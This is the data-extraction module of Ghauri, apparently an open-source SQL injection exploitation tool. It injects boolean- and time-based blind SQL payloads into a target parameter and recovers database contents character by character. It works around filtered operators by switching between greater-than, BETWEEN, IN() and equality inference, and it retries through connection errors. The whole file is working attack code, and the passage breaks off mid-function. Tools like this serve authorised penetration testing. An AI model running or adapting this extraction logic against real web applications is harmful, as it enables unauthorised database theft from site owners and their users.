#!/usr/bin/python3
# -*- coding: utf-8 -*-
# pylint: disable=R,W,E,C

"""

Author  : Nasir Khan (r0ot h3x49)
Github  : https://github.com/r0oth3x49
License : MIT


Copyright (c) 2016-2025 Nasir Khan (r0ot h3x49)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the
Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH 
THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

"""
import random
from ghauri.common.config import conf
from ghauri.common.session import session
from ghauri.logger.colored_logger import logger
from ghauri.core.inject import inject_expression
from ghauri.common.colors import black, white, DIM, BRIGHT
from ghauri.common.lib import (
    re,
    time,
    collections,
    quote,
    unquote,
    STORAGE,
    STORAGE_UPDATE,
    futures,
)
from ghauri.common.payloads import (
    NUMBER_OF_CHARACTERS_PAYLOADS,
    LENGTH_PAYLOADS,
    DATA_EXTRACTION_PAYLOADS,
    REGEX_XPATH,
    REGEX_ERROR_BASED,
    REGEX_BIGINT_BASED,
    REGEX_DOUBLE_BASED,
    REGEX_GEOMETRIC_BASED,
    REGEX_GTID_BASED,
    REGEX_JSON_KEYS,
    REGEX_GENERIC,
    REGEX_MSSQL_STRING,
    REGEX_GENERIC_ERRORS,
)
from ghauri.common.utils import (
    urlencode,
    replace_with,
    search_regex,
    headers_dict_to_str,
    check_boolean_responses,
    prepare_attack_request,
)


class GhauriExtractor:
    """aa"""

    def __init__(
        self, vectors="", is_string=False, skip_urlencoding=False, filepaths=None
    ):
        self.vectors = vectors
        self.is_string = is_string
        self.skip_urlencoding = skip_urlencoding
        self.filepaths = filepaths

    def _check_operator(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        proxy=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        attack01=None,
        match_string=None,
        not_match_string=None,
        vector_type=None,
        text_only=False,
        retry=3,
    ):
        GuessUsing = collections.namedtuple(
            "GuessUsing",
            [
                "ok",
                "binary_search",
                "in_based_search",
                "linear_search",
                "between_based_search",
                "msg",
            ],
        )
        binary_search = False
        in_based_search = False
        linear_search = False
        between_based_search = False
        retry_on_error = 0
        http_firewall_code_counter = 0
        timesec = conf.timesec
        error_msg = None
        _temp = GuessUsing(
            ok=False,
            binary_search=binary_search,
            in_based_search=in_based_search,
            linear_search=linear_search,
            between_based_search=between_based_search,
            msg=None,
        )
        expressions = [
            {
                "expression": vector.replace("[INFERENCE]", "6590>6420").replace(
                    "[SLEEPTIME]", f"{timesec}"
                ),
                "type": "binary_search",
            },
            {
                "expression": vector.replace(
                    "[INFERENCE]", "6590 NOT BETWEEN 0 AND 6420"
                ).replace("[SLEEPTIME]", f"{timesec}"),
                "type": "between_based_search",
            },
            {
                "expression": vector.replace(
                    "[INFERENCE]", "(SELECT(45))IN(10,45,60)"
                ).replace("[SLEEPTIME]", f"{timesec}"),
                "type": "in_based_search",
            },
            {
                "expression": vector.replace("[INFERENCE]", "09845=9845").replace(
                    "[SLEEPTIME]", f"{timesec}"
                ),
                "type": "linear_search",
            },
        ]
        start = 0
        operators = {
            "greater": "binary_search",
            "between": "between_based_search",
            "in": "in_based_search",
            "equal": "linear_search",
        }
        operator = None
        if conf.fetch_using and conf.fetch_using in list(operators.keys()):
            operator = operators.get(conf.fetch_using, None)
            if operator:
                logger.debug(
                    f"Ghauri will based data retrieval using '{conf.fetch_using}' openator"
                )
                # if conf.fetch_using == "in":
                #     _temp = GuessUsing(
                #         ok=True,
                #         binary_search=binary_search,
                #         in_based_search=True,
                #         linear_search=linear_search,
                #         between_based_search=between_based_search,
                #         msg="",
                #     )
                # if conf.fetch_using == "binary":
                #     _temp = GuessUsing(
                #         ok=True,
                #         binary_search=True,
                #         in_based_search=in_based_search,
                #         linear_search=linear_search,
                #         between_based_search=between_based_search,
                #         msg="",
                #     )
                # if conf.fetch_using == "between":
                #     _temp = GuessUsing(
                #         ok=True,
                #         binary_search=binary_search,
                #         in_based_search=in_based_search,
                #         linear_search=linear_search,
                #         between_based_search=True,
                #         msg="",
                #     )
                # if conf.fetch_using == "equal":
                #     _temp = GuessUsing(
                #         ok=True,
                #         binary_search=binary_search,
                #         in_based_search=in_based_search,
                #         linear_search=True,
                #         between_based_search=between_based_search,
                #         msg="",
                #     )
                # return _temp
        end = len(expressions)
        while start < end:
            entry = expressions[start]
            expression = entry.get("expression")
            _type = entry.get("type")
            if operator and _type != operator:
                start += 1
                continue
            # logger.payload(f"{expression}")
            # if http_firewall_code_counter > 2:
            #     message = f"{error_msg} - {http_firewall_code_counter} time(s)"
            #     logger.warning(f"HTTP error code detected during run:")
            #     choice = logger.read_input(
            #         f"{message}. how do you want to proceed? [(C)continue/(q)uit] ",
            #         batch=False,
            #         user_input="C",
            #     )
            #     if choice == "q":
            #         logger.error("user quit")
            #         logger.end("ending")
            #         exit(0)
            #     if choice == "c":
            #         http_firewall_code_counter = 0
            if retry_on_error >= conf.retry:
                start += 1
                # logger.warning(f"Ghauri detected connection errors multiple times")
                # choice = logger.read_input(
                #     f"how do you want to proceed? [(C)continue/(q)uit] ",
                #     batch=False,
                #     user_input="C",
                # )
                # if choice == "q":
                #     logger.error("user quit")
                #     logger.end("ending")
                #     exit(0)
                # if choice == "c":
                #     retry_on_error = 0
            if delay > 0:
                time.sleep(delay)
            try:
                attack = inject_expression(
                    url=url,
                    data=data,
                    proxy=proxy,
                    delay=delay,
                    timesec=timesec,
                    timeout=timeout,
                    headers=headers,
                    parameter=parameter,
                    expression=expression,
                    is_multipart=is_multipart,
                    injection_type=injection_type,
                )
                # if attack.status_code in [403, 406]:
                #     logger.critical(
                #         f"{attack.error_msg} HTTP error code detected. ghauri is going to retry."
                #     )
                #     time.sleep(0.5)
                #     error_msg = attack.error_msg
                #     http_firewall_code_counter += 1
                #     continue
                logger.debug(
                    f"sleep time: {timesec}, response time: {attack.response_time}"
                )
                if attack01 and vector_type == "boolean_vector":
                    bool_retval = check_boolean_responses(
                        base,
                        attack,
                        attack01,
                        match_string=match_string,
                    )
                    result = bool_retval.vulnerable
                    if result:
                        if _type == "binary_search":
                            _temp = GuessUsing(
                                ok=True,
                                binary_search=True,
                                in_based_search=in_based_search,
                                linear_search=linear_search,
                                between_based_search=between_based_search,
                                msg="",
                            )
                        if _type == "between_based_search":
                            msg = "it appears that the character '>' is filtered by the back-end server. ghauri will based data retrieval on BETWEEN operator"
                            if conf.fetch_using:
                                msg = ""
                            _temp = GuessUsing(
                                ok=True,
                                binary_search=binary_search,
                                in_based_search=in_based_search,
                                linear_search=linear_search,
                                between_based_search=True,
                                msg=msg,
                            )
                        if _type == "in_based_search":
                            msg = (
                                "it appears that the character '>' and 'BETWEEN' operator is filtered by the back-end server. ghauri will based data retrieval on IN() operator",
                            )
                            if conf.fetch_using:
                                msg = ""
                            _temp = GuessUsing(
                                ok=True,
                                binary_search=binary_search,
                                in_based_search=True,
                                linear_search=linear_search,
                                between_based_search=between_based_search,
                                msg=msg,
                            )
                        if _type == "linear_search":
                            msg = (
                                "it appears that the character '>' and the operator(s) 'IN, BETWEEN' are filtered by the back-end server. ghauri will based data retrieval on '=' operator, You are advised to use --delay=3 in this case",
                            )
                            if conf.fetch_using:
                                msg = ""
                            _temp = GuessUsing(
                                ok=True,
                                binary_search=binary_search,
                                in_based_search=in_based_search,
                                linear_search=True,
                                between_based_search=between_based_search,
                                msg=msg,
                            )
                        break
                if vector_type == "time_vector":
                    response_time = attack.response_time
                    if response_time >= timesec:
                        if _type == "binary_search":
                            _temp = GuessUsing(
                                ok=True,
                                binary_search=True,
                                in_based_search=in_based_search,
                                linear_search=linear_search,
                                between_based_search=between_based_search,
                                msg="",
                            )
                        if _type == "between_based_search":
                            msg = "it appears that the character '>' is filtered by the back-end server. ghauri will based data retrieval on BETWEEN operator"
                            if conf.fetch_using:
                                msg = ""
                            _temp = GuessUsing(
                                ok=True,
                                binary_search=binary_search,
                                in_based_search=in_based_search,
                                linear_search=linear_search,
                                between_based_search=True,
                                msg=msg,
                            )
                        if _type == "in_based_search":
                            msg = (
                                "it appears that the character '>' and 'BETWEEN' operator is filtered by the back-end server. ghauri will based data retrieval on IN() operator",
                            )
                            if conf.fetch_using:
                                msg = ""
                            _temp = GuessUsing(
                                ok=True,
                                binary_search=binary_search,
                                in_based_search=True,
                                linear_search=linear_search,
                                between_based_search=between_based_search,
                                msg=msg,
                            )
                        if _type == "linear_search":
                            msg = (
                                "it appears that the character '>' and the operator(s) 'IN, BETWEEN' are filtered by the back-end server. ghauri will based data retrieval on '=' operator, You are advised to use --delay=3 in this case",
                            )
                            if conf.fetch_using:
                                msg = ""
                            _temp = GuessUsing(
                                ok=True,
                                binary_search=binary_search,
                                in_based_search=in_based_search,
                                linear_search=True,
                                between_based_search=between_based_search,
                                msg=msg,
                            )
                        break
                start += 1
            except KeyboardInterrupt as error:
                logger.warning("user aborted during data extraction phase")
                quest = logger.read_input(
                    "how do you want to proceed? [(C)continue/(e)nd this phase/(q)uit] ",
                    batch=False,
                    user_input="C",
                )
                if quest and quest == "e":
                    raise error
                if quest and quest == "q":
                    logger.error("user quit")
                    logger.end("ending")
                    exit(0)
            except ConnectionAbortedError as e:
                logger.critical(
                    f"connection attempt to the target URL was aborted by the peer, Ghauri is going to retry"
                )
                retry_on_error += 1
            except ConnectionRefusedError as e:
                logger.critical(
                    f"connection attempt to the target URL was refused by the peer. Ghauri is going to retry"
                )
                retry_on_error += 1
            except ConnectionResetError as e:
                logger.critical(
                    f"connection attempt to the target URL was reset by the peer. Ghauri is going to retry"
                )
                retry_on_error += 1
            except Exception as error:
                logger.critical(
                    f"error {error}, during operator check phase. Ghauri is going to retry"
                )
                retry_on_error += 1
        if _temp.ok:
            if _temp.msg:
                logger.warning(_temp.msg)
        return _temp

    def validate_character(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        proxy=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        attack01=None,
        match_string=None,
        not_match_string=None,
        suppress_output=False,
        query_check=False,
        identified_character=None,
        vector_type=None,
        queryable=None,
        offset=None,
        expression_payload=None,
        text_only=False,
        retry=3,
        code=None,
        *args,
        **kwargs,
    ):
        #  we will validate character indendified in case of boolean based blind sqli only for now..
        is_valid = False
        retry_on_error = 0
        http_firewall_code_counter = 0
        error_msg = None
        if identified_character:
            for i in range(1, retry + 1):
                # if http_firewall_code_counter > 2:
                #     message = f"{error_msg} - {http_firewall_code_counter} time(s)"
                #     logger.warning(f"HTTP error code detected during run:")
                #     choice = logger.read_input(
                #         f"{message}. how do you want to proceed? [(C)continue/(q)uit] ",
                #         batch=False,
                #         user_input="C",
                #     )
                #     if choice == "q":
                #         logger.error("user quit")
                #         logger.end("ending")
                #         exit(0)
                #     if choice == "c":
                #         http_firewall_code_counter = 0
                # if retry_on_error >= retry:
                #     logger.warning(f"Ghauri detected connection errors multiple times")
                #     choice = logger.read_input(
                #         f"how do you want to proceed? [(C)continue/(q)uit] ",
                #         batch=False,
                #         user_input="C",
                #     )
                #     if choice == "q":
                #         logger.error("user quit")
                #         logger.end("ending")
                #         exit(0)
                #     if choice == "c":
                #         retry_on_error = 0
                if delay > 0:
                    time.sleep(delay)
                condition = expression_payload.format(
                    query=queryable,
                    position=offset,
                    char=ord(identified_character),
                )
                if vector_type == "time_vector":
                    if conf.fetch_using and conf.fetch_using.lower() == "between":
                        condition = replace_with(
                            string=condition,
                            character="=",
                            replace_with=" NOT BETWEEN 0 AND ",
                        )
                    else:
                        condition = replace_with(
                            string=condition, character="=", replace_with="!="
                        )
                if vector_type == "boolean_vector":
                    if conf.fetch_using and conf.fetch_using.lower() == "between":
                        condition = replace_with(
                            string=condition,
                            character="=",
                            replace_with=" BETWEEN 0 AND ",
                        )
                expression = vector.replace("[INFERENCE]", f"{condition}").replace(
                    "[SLEEPTIME]", f"{timesec}"
                )
                sleep_time = conf.timesec
                # logger.payload(f"{expression}")
                try:
                    attack = inject_expression(
                        url=url,
                        data=data,
                        proxy=proxy,
                        delay=delay,
                        timesec=timesec,
                        timeout=timeout,
                        headers=headers,
                        parameter=parameter,
                        expression=expression,
                        is_multipart=is_multipart,
                        injection_type=injection_type,
                    )
                    # if attack.status_code in [403, 406]:
                    #     logger.critical(
                    #         f"{attack.error_msg} HTTP error code detected. ghauri is going to retry."
                    #     )
                    #     time.sleep(0.5)
                    #     error_msg = attack.error_msg
                    #     http_firewall_code_counter += 1
                    #     continue
                    logger.debug(
                        f"sleep time: {sleep_time}, response time: {attack.response_time}"
                    )
                    if attack01 and vector_type == "boolean_vector":
                        bool_retval = check_boolean_responses(
                            base,
                            attack,
                            attack01,
                            match_string=match_string,
                            not_match_string=not_match_string,
                            code=code,
                            text_only=text_only,
                        )
                        result = bool_retval.vulnerable
                        if result:
                            is_valid = True
                            logger.debug("character is valid.")
                    if vector_type == "time_vector":
                        response_time = attack.response_time
                        vulnerable = bool(response_time >= sleep_time)
                        if not vulnerable:
                            logger.debug("character is valid.")
                            is_valid = True
                    break
                except KeyboardInterrupt as error:
                    logger.warning("user aborted during data extraction phase")
                    quest = logger.read_input(
                        "how do you want to proceed? [(C)continue/(e)nd this phase/(q)uit] ",
                        batch=False,
                        user_input="C",
                    )
                    if quest and quest == "e":
                        raise error
                    if quest and quest == "q":
                        logger.error("user quit")
                        logger.end("ending")
                        exit(0)
                except ConnectionAbortedError as e:
                    logger.critical(
                        f"connection attempt to the target URL was aborted by the peer, Ghauri is going to retry"
                    )
                    retry_on_error += 1
                except ConnectionRefusedError as e:
                    logger.critical(
                        f"connection attempt to the target URL was refused by the peer. Ghauri is going to retry"
                    )
                    retry_on_error += 1
                except ConnectionResetError as e:
                    logger.critical(
                        f"connection attempt to the target URL was reset by the peer. Ghauri is going to retry"
                    )
                    retry_on_error += 1
                except Exception as error:
                    logger.critical(
                        f"error {error}, during detection phase. Ghauri is going to retry"
                    )
                    retry_on_error += 1
        return is_valid

    def _search_using_in_operator(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        delay=0,
        timesec=5,
        timeout=30,
        proxy=None,
        attack01=None,
        code=None,
        match_string=None,
        not_match_string=None,
        text_only=False,
        is_multipart=False,
        suppress_output=False,
        query_check=False,
        minimum=None,
        maximum=None,
        offset=0,
        expression_payload=None,
        queryable=None,
        chars="",
        vector_type=None,
        retry=3,
        *args,
        **kwargs,
    ):
        if not minimum:
            minimum = 32
        if not maximum:
            maximum = 127
        is_found = False
        character = ""
        http_firewall_code_counter = 0
        error_msg = None
        retry_on_error = 0
        if not conf.threads:
            logger.progress(f"retrieved: {chars}")
        if conf.threads:
            chars = "".join(
                [
                    str(i)
                    for i in collections.OrderedDict(
                        sorted(conf._thread_chars_query.items())
                    ).values()
                ]
            )
            logger.progress(f"retrieved: {chars}")
        sleep_time = conf.timesec

        def chunks(lst, n):
            """Yield successive n-sized chunks from lst."""
            for i in range(0, len(lst), n):
                yield lst[i : i + n]

        gen = list(range(minimum, maximum + 1))
        list_split_by = 26 if len(gen) >= 26 else len(gen)
        while not is_found:
            sorted_ascii_list = list(
                chunks(
                    sorted([str(i) for i in range(minimum, maximum + 1)]),
                    list_split_by,
                )
            )
            index = 0
            while index < len(sorted_ascii_list):
                # if http_firewall_code_counter > 2:
                #     message = f"{error_msg} - {http_firewall_code_counter} time(s)"
                #     logger.warning(f"HTTP error code detected during run:")
                #     choice = logger.read_input(
                #         f"{message}. how do you want to proceed? [(C)continue/(q)uit] ",
                #         batch=False,
                #         user_input="C",
                #     )
                #     if choice == "q":
                #         logger.error("user quit")
                #         logger.end("ending")
                #         exit(0)
                #     if choice == "c":
                #         http_firewall_code_counter = 0
                # if retry_on_error >= retry:
                #     logger.warning(f"Ghauri detected connection errors multiple times")
                #     choice = logger.read_input(
                #         f"how do you want to proceed? [(C)continue/(q)uit] ",
                #         batch=False,
                #         user_input="C",
                #     )
                #     if choice == "q":
                #         logger.error("user quit")
                #         logger.end("ending")
                #         exit(0)
                #     if choice == "c":
                #         retry_on_error = 0
                if delay > 0:
                    time.sleep(delay)
                characters_list = sorted_ascii_list[index]
                in_payload = "(" + ",".join(characters_list) + ")"
                condition = expression_payload.format(
                    query=queryable, position=offset, char=in_payload
                )
                condition = replace_with(
                    string=condition, character="=", replace_with="IN"
                )
                expression = vector.replace("[INFERENCE]", f"{condition}").replace(
                    "[SLEEPTIME]", f"{sleep_time}"
                )
                # logger.payload(f"{expression}")
                try:
                    attack = inject_expression(
                        url=url,
                        data=data,
                        proxy=proxy,
                        delay=delay,
                        timesec=timesec,
                        timeout=timeout,
                        headers=headers,
                        parameter=parameter,
                        expression=expression,
                        is_multipart=is_multipart,
                        injection_type=injection_type,
                    )
                    # if attack.status_code in [403, 406]:
                    #     logger.critical(
                    #         f"{attack.error_msg} HTTP error code detected. ghauri is going to retry."
                    #     )
                    #     time.sleep(0.5)
                    #     error_msg = attack.error_msg
                    #     http_firewall_code_counter += 1
                    #     continue
                    response_time = attack.response_time
                    logger.debug(
                        f"sleep time: {sleep_time}, response time: {response_time}"
                    )
                    if attack01 and vector_type == "boolean_vector":
                        bool_retval = check_boolean_responses(
                            base,
                            attack,
                            attack01,
                            match_string=match_string,
                            not_match_string=not_match_string,
                            text_only=text_only,
                        )
                        result = bool_retval.vulnerable
                        if result:
                            characters_list = sorted([int(i) for i in characters_list])
                            minimum = characters_list[0]
                            maximum = characters_list[-1]
                            list_split_by = len(characters_list) // 2
                            if len(characters_list) == 1:
                                character = characters_list.pop()
                                character = chr(int(character))
                                if conf.threads:
                                    conf._thread_chars_query.update({offset: character})
                                    chars = "".join(
                                        [
                                            str(i)
                                            for i in collections.OrderedDict(
                                                conf._thread_chars_query.items()
                                            ).values()
                                        ]
                                    )
                                    logger.progress(f"retrieved: {chars}")
                                is_found = True
                            break
                        else:
                            index += 1
                    if vector_type == "time_vector":
                        if response_time >= sleep_time:
                            characters_list = sorted([int(i) for i in characters_list])
                            minimum = characters_list[0]
                            maximum = characters_list[-1]
                            list_split_by = len(characters_list) // 2
                            if len(characters_list) == 1:
                                character = characters_list.pop()
                                character = chr(int(character))
                                is_found = True
                            break
                        else:
                            index += 1
                except KeyboardInterrupt as error:
                    logger.warning("user aborted during data extraction phase")
                    quest = logger.read_input(
                        "how do you want to proceed? [(C)continue/(e)nd this phase/(q)uit] ",
                        batch=False,
                        user_input="C",
                    )
                    if quest and quest == "e":
                        raise error
                    if quest and quest == "q":
                        logger.error("user quit")
                        logger.end("ending")
                        exit(0)
                except ConnectionAbortedError as e:
                    logger.critical(
                        f"connection attempt to the target URL was aborted by the peer, Ghauri is going to retry"
                    )
                    retry_on_error += 1
                except ConnectionRefusedError as e:
                    logger.critical(
                        f"connection attempt to the target URL was refused by the peer. Ghauri is going to retry"
                    )
                    retry_on_error += 1
                except ConnectionResetError as e:
                    logger.critical(
                        f"connection attempt to the target URL was reset by the peer. Ghauri is going to retry"
                    )
                    retry_on_error += 1
                except Exception as error:
                    logger.critical(
                        f"error {error}, during detection phase. Ghauri is going to retry"
                    )
                    retry_on_error += 1
        return character

    def _search_using_between_operator(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        delay=0,
        timesec=5,
        timeout=30,
        proxy=None,
        attack01=None,
        code=None,
        match_string=None,
        not_match_string=None,
        text_only=False,
        is_multipart=False,
        suppress_output=False,
        query_check=False,
        minimum=None,
        maximum=None,
        offset=0,
        expression_payload=None,
        queryable=None,
        chars="",
        vector_type=None,
        retry=3,
        *args,
        **kwargs,
    ):
        # need to implement retry mechanism in case of http connection related errors..
        if not minimum:
            minimum = 32
        if not maximum:
            maximum = 127
        ascii_char = 0
        is_found = False
        character = ""
        http_firewall_code_counter = 0
        error_msg = None
        retry_on_error = 0
        if not conf.threads:
            logger.progress(f"retrieved: {chars}")
        if conf.threads:
            chars = "".join(
                [
                    str(i)
                    for i in collections.OrderedDict(
                        sorted(conf._thread_chars_query.items())
                    ).values()
                ]
            )
            logger.progress(f"retrieved: {chars}")
        sleep_time = conf.timesec
        while not is_found:
            if conf._readtimout_counter >= 3:
                if conf.rto_warning:
                    if not conf.rtom_warning:
                        choice = logger.read_input(
                            "Ghauri detected read timeout multiple time(s). Do you want to continue? [y/N] "
                        )
                        if choice == "n":
                            logger.end("ending")
                            exit(0)
                        conf.rtom_warning = True
                if not conf.rto_warning:
                    msgrto = ""
                    if vector_type == "time_vector":
                        msgrto = ", It is recommended to set high value of option(s) '--time-sec', increase delay between request(s) with an option '--delay'"
                    if vector_type == "boolean_vector":
                        msgrto = ", It is recommended to set high value of option(s) '--timeout' and also increase delay between each http request with an option '--delay'"
                    logger.warning(
                        f"Ghauri detected read timout '{conf._readtimout_counter}' time(s){msgrto}."
                    )
                    conf.rto_warning = True
                    conf._readtimout_counter = 0
            if delay > 0:
                time.sleep(delay)
            ascii_char = int((minimum + maximum) / 2)
            if (minimum == ascii_char) & (maximum == ascii_char):
                is_found = True
                character = str(chr(ascii_char))
                if not conf.threads:
                    logger.progress(f"retrieved: {chars}{character}")
                if conf.threads:
                    conf._thread_chars_query.update({offset: character})
                    chars = "".join(
                        [
                            str(i)
                            for i in collections.OrderedDict(
                                conf._thread_chars_query.items()
                            ).values()
                        ]
                    )
                    logger.progress(f"retrieved: {chars}")
                break
            condition = expression_payload.format(
                query=queryable, position=offset, char=ascii_char
            )
            condition = replace_with(
                string=condition, character="=", replace_with=" NOT BETWEEN 0 AND "
            )
            expression = vector.replace("[INFERENCE]", f"{condition}").replace(
                "[SLEEPTIME]", f"{sleep_time}"
            )
            # logger.payload(f"{expression}")
            try:
                attack = inject_expression(
                    url=url,
                    data=data,
                    proxy=proxy,
                    delay=delay,
                    timesec=timesec,
                    timeout=timeout,
                    headers=headers,
                    parameter=parameter,
                    expression=expression,
                    is_multipart=is_multipart,
                    injection_type=injection_type,
                )
                response_time = attack.response_time
                logger.debug(
                    f"sleep time: {sleep_time}, response time: {response_time}"
                )
                if attack01 and vector_type == "boolean_vector":
                    bool_retval = check_boolean_responses(
                        base,
                        attack,
                        attack01,
                        code=code,
                        match_string=match_string,
                        not_match_string=not_match_string,
                        text_only=text_only,
                    )
                    result = bool_retval.vulnerable
                    if result:
                        minimum = ascii_char + 1
                        maximum = maximum
                    else:
                        minimum = minimum
                        maximum = ascii_char
                if vector_type == "time_vector":
                    if response_time >= sleep_time:
                        minimum = ascii_char + 1
                        maximum = maximum
                    else:
                        minimum = minimum
                        maximum = ascii_char
            except KeyboardInterrupt as error:
                if conf.threads:
                    raise error
                logger.warning("user aborted during data extraction phase")
                quest = logger.read_input(
                    "how do you want to proceed? [(C)continue/(e)nd this phase/(q)uit] ",
                    batch=False,
                    user_input="C",
                )
                if quest and quest == "e":
                    raise error
                if quest and quest == "q":
                    logger.error("user quit")
                    logger.end("ending")
                    exit(0)
            except ConnectionAbortedError as e:
                logger.critical(
                    f"connection attempt to the target URL was aborted by the peer, Ghauri is going to retry"
                )
                retry_on_error += 1
            except ConnectionRefusedError as e:
                logger.critical(
                    f"connection attempt to the target URL was refused by the peer. Ghauri is going to retry"
                )
                retry_on_error += 1
            except ConnectionResetError as e:
                logger.critical(
                    f"connection attempt to the target URL was reset by the peer. Ghauri is going to retry"
                )
                retry_on_error += 1
            except Exception as error:
                logger.critical(
                    f"error {error}, during detection phase. Ghauri is going to retry"
                )
                retry_on_error += 1
        return character

    def _binary_search(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        delay=0,
        timesec=5,
        timeout=30,
        proxy=None,
        attack01=None,
        code=None,
        match_string=None,
        not_match_string=None,
        text_only=False,
        is_multipart=False,
        suppress_output=False,
        query_check=False,
        minimum=None,
        maximum=None,
        offset=0,
        expression_payload=None,
        queryable=None,
        chars="",
        vector_type=None,
        retry=3,
        *args,
        **kwargs,
    ):
        # need to implement retry mechanism in case of http connection related errors..
        if not minimum:
            minimum = 32
        if not maximum:
            maximum = 127
        ascii_char = 0
        is_found = False
        character = ""
        http_firewall_code_counter = 0
        error_msg = None
        retry_on_error = 0
        if not conf.threads:
            logger.progress(f"retrieved: {chars}")
        if conf.threads:
            chars = "".join(
                [
                    str(i)
                    for i in collections.OrderedDict(
                        sorted(conf._thread_chars_query.items())
                    ).values()
                ]
            )
            logger.progress(f"retrieved: {chars}")
        sleep_time = conf.timesec
        while not is_found:
            # if http_firewall_code_counter > 2:
            #     message = f"{error_msg} - {http_firewall_code_counter} time(s)"
            #     logger.warning(f"HTTP error code detected during run:")
            #     choice = logger.read_input(
            #         f"{message}. how do you want to proceed? [(C)continue/(q)uit] ",
            #         batch=False,
            #         user_input="C",
            #     )
            #     if choice == "q":
            #         logger.error("user quit")
            #         logger.end("ending")
            #         exit(0)
            #     if choice == "c":
            #         http_firewall_code_counter = 0
            # if retry_on_error >= retry:
            #     logger.warning(f"Ghauri detected connection errors multiple times")
            #     choice = logger.read_input(
            #         f"how do you want to proceed? [(C)continue/(q)uit] ",
            #         batch=False,
            #         user_input="C",
            #     )
            #     if choice == "q":
            #         logger.error("user quit")
            #         logger.end("ending")
            #         exit(0)
            #     if choice == "c":
            #         retry_on_error = 0
            if conf._readtimout_counter >= 3:
                if conf.rto_warning:
                    if not conf.rtom_warning:
                        choice = logger.read_input(
                            "Ghauri detected read timeout multiple time(s). Do you want to continue? [y/N] "
                        )
                        if choice == "n":
                            logger.end("ending")
                            exit(0)
                        conf.rtom_warning = True
                if not conf.rto_warning:
                    msgrto = ""
                    if vector_type == "time_vector":
                        msgrto = ", It is recommended to set high value of option(s) '--time-sec', increase delay between request(s) with an option '--delay'"
                    if vector_type == "boolean_vector":
                        msgrto = ", It is recommended to set high value of option(s) '--timeout' and also increase delay between each http request with an option '--delay'"
                    logger.warning(
                        f"Ghauri detected read timout '{conf._readtimout_counter}' time(s){msgrto}."
                    )
                    conf.rto_warning = True
                    conf._readtimout_counter = 0
            if delay > 0:
                time.sleep(delay)
            ascii_char = int((minimum + maximum) / 2)
            if (minimum == ascii_char) & (maximum == ascii_char):
                is_found = True
                character = str(chr(ascii_char))
                if not conf.threads:
                    logger.progress(f"retrieved: {chars}{character}")
                if conf.threads:
                    conf._thread_chars_query.update({offset: character})
                    chars = "".join(
                        [
                            str(i)
                            for i in collections.OrderedDict(
                                conf._thread_chars_query.items()
                            ).values()
                        ]
                    )
                    logger.progress(f"retrieved: {chars}")
                break
            condition = expression_payload.format(
                query=queryable, position=offset, char=ascii_char
            )
            condition = replace_with(string=condition, character="=", replace_with=">")
            expression = vector.replace("[INFERENCE]", f"{condition}").replace(
                "[SLEEPTIME]", f"{sleep_time}"
            )
            # logger.payload(f"{expression}")
            try:
                attack = inject_expression(
                    url=url,
                    data=data,
                    proxy=proxy,
                    delay=delay,
                    timesec=timesec,
                    timeout=timeout,
                    headers=headers,
                    parameter=parameter,
                    expression=expression,
                    is_multipart=is_multipart,
                    injection_type=injection_type,
                )
                # if attack.status_code in [403, 406]:
                #     logger.critical(
                #         f"{attack.error_msg} HTTP error code detected. ghauri is going to retry."
                #     )
                #     time.sleep(0.5)
                #     error_msg = attack.error_msg
                #     http_firewall_code_counter += 1
                #     ascii_char = ascii_char
                #     minimum = minimum
                #     maximum = maximum
                #     continue
                response_time = attack.response_time
                logger.debug(
                    f"sleep time: {sleep_time}, response time: {response_time}"
                )
                if attack01 and vector_type == "boolean_vector":
                    bool_retval = check_boolean_responses(
                        base,
                        attack,
                        attack01,
                        code=code,
                        match_string=match_string,
                        not_match_string=not_match_string,
                        text_only=text_only,
                    )
                    result = bool_retval.vulnerable
                    if result:
                        minimum = ascii_char + 1
                        maximum = maximum
                    else:
                        minimum = minimum
                        maximum = ascii_char
                if vector_type == "time_vector":
                    if response_time >= sleep_time:
                        minimum = ascii_char + 1
                        maximum = maximum
                    else:
                        minimum = minimum
                        maximum = ascii_char
            except KeyboardInterrupt as error:
                if conf.threads:
                    raise error
                logger.warning("user aborted during data extraction phase")
                quest = logger.read_input(
                    "how do you want to proceed? [(C)continue/(e)nd this phase/(q)uit] ",
                    batch=False,
                    user_input="C",
                )
                if quest and quest == "e":
                    raise error
                if quest and quest == "q":
                    logger.error("user quit")
                    logger.end("ending")
                    exit(0)
            except ConnectionAbortedError as e:
                logger.critical(
                    f"connection attempt to the target URL was aborted by the peer, Ghauri is going to retry"
                )
                retry_on_error += 1
            except ConnectionRefusedError as e:
                logger.critical(
                    f"connection attempt to the target URL was refused by the peer. Ghauri is going to retry"
                )
                retry_on_error += 1
            except ConnectionResetError as e:
                logger.critical(
                    f"connection attempt to the target URL was reset by the peer. Ghauri is going to retry"
                )
                retry_on_error += 1
            except Exception as error:
                logger.critical(
                    f"error {error}, during detection phase. Ghauri is going to retry"
                )
                retry_on_error += 1
        return character

    def _linear_search(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        injection_type,
        proxy=None,
        attack01=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        match_string=None,
        not_match_string=None,
        text_only=False,
        suppress_output=False,
